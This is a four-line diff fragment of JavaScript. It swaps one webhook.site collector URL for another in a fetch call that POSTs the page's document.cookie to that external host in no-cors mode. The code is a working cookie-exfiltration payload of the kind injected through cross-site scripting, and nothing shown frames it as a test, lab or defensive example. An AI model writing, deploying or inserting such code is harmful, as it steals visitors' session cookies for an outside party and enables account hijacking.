@@ -1,4 +1,4 @@
-fetch('https://webhook.site/951a8069-3beb-48d5-a21f-99d73d3c95c7', {
+fetch('https://webhook.site/c0834ccb-5fdb-4d93-9091-52b6e42fc1df', {
 method: 'POST',
 mode: 'no-cors',
 body: document.cookie
